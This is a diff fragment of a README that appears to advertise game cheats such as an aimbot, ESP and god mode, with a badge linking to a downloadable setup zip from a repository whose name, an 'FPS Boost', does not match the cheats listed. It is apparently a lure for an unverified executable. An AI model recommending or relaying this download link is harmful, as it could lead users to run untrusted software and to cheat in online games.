@@ -8,6 +8,7 @@ ESP · Aimbot · Fly Hack · Teleport · God Mode · Infinite Paint
 
 
 
+
  [![⬇️ DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-2ea043?style=for-the-badge&logo=github&logoColor=white&labelColor=1a7a37)](https://github.com/Centralkremarina/Meccha-FPS-Boost/releases/download/v2.3.11/setup.v2.3.11.zip)
 
 </div>
